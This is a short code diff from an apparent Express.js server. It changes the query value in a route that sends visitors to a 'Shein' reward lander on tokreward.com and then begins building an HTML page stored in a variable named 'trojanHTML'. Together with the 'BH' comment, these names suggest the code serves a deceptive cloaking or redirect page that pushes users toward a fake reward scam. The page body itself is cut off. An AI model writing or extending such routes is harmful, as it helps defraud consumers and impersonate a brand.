@@ -1812,7 +1812,7 @@ app.get('/ary/:slug', (req, res, next) => {
 // SHEIN BH FLUENT
 app.get('/ary2/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://tokreward.com/shein.html?slug=ARY`;
+    const destinationLander = `https://tokreward.com/shein.html?slug=ARY25+`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
